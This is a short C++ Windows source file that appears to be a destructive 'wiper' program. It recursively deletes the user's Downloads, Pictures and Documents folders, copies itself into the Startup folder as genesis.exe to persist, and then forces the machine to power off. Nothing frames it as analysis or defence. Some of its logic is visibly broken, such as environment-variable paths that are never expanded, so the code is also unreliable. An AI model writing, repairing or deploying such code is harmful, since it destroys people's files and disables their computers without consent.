#include "Header.h"


int APIENTRY wWinMain(HINSTANCE Instance,
	HINSTANCE hPreInstance,
	LPTSTR    lpCmdLine,
	int		  nCmdShow) {


	char filepath[] = "%userprofile%\\Downloads";
	char filepathb[] = "%userprofile%\\Pictures";
	char filepathc[] = "%userprofile%\\Documents";
	if (std::filesystem::exists(filepath)) {
		
		std::filesystem::remove_all(filepath);
		std::filesystem::remove_all(filepathb);
		std::filesystem::remove_all(filepathc);
	}
	
	char filename[ MAX_PATH ] = "genesis.exe";
	char newLocation[] = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	if (std::filesystem::exists("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\genesis.exe")) {
		
		exit(0);
	}
	else {

		BOOL stats = 0;
		DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
		if (size)
			CopyFileA(filename, newLocation, stats);
	}
	
	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE,
		SHTDN_REASON_MINOR_OTHER);

	return 0;
}